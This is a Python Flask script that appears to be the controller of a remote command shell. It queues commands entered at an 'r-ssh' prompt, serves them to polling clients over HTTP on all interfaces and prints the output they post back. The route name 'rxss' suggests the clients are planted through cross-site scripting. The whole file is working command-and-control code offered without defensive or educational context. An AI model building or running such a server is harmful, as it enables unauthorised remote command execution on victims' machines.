from flask import Flask, request
from threading import Thread
from waitress import serve
import time
import os

with open("port.txt", "r") as f:
    port = int(f.read())


app = Flask(__name__)

def clear():
    if os.name=="nt":
        os.system("cls")
    else:
        os.system("clear")

# ----------------------------------------

def add_code(id, code):
    global code_list
    code_list.append([id, code])

def get_code():
    global code_list
    if len(code_list)>0:
        output = code_list[0][0] + "%üğş" + code_list[0][1]
        code_list = code_list[1:]
        return(output)
    return("")

def get_resp(id):
    global response_list
    for i in range(len(response_list)):
        if response_list[i][0]==id:
            res = response_list[i][1]
            response_list.pop(i)
            return(res)
    return(False)

def rm_from_list(lis, index):
    out_list = []
    for i in lis:
        if not i==index:
            out_list.append(i)
    return(out_list)

def send_code(code):
    ids = list(range(1000))
    for i in code_list:
        ids = rm_from_list(ids, i[0])
    id = str(ids[0])
    add_code(id, code)
    return(id)

def get_response(code):
    id = send_code(code)
    while True:
        res = get_resp(id)
        if str(type(res))=="<class 'str'>":
            break
        time.sleep(0.01)
    return(res)

# ----------------------------------------

code_list = []
response_list = []

@app.route("/", methods=["GET", "POST", "DELETE"])
def rxss():
    global code_list
    if request.method == "GET":
        return(get_code())
    elif request.method == "POST":
        data = request.form.get("return_text")
        response_list.append(data.split("%üğş"))
        return("",200)
    elif request.method == "DELETE":
        pass

def repl_func():
    while True:
        code = input("r-ssh:~"+get_response("pwd")[:-1]+" $")
        if (code==""):
            continue
        elif (code=="clear"):
            clear()
        elif (code=="exit"):
            exit()
        else:
            print(get_response(code),end="")

if __name__=="__main__":
    clear()
    Thread(target=repl_func).start()
    serve(app, host="0.0.0.0", port=port)

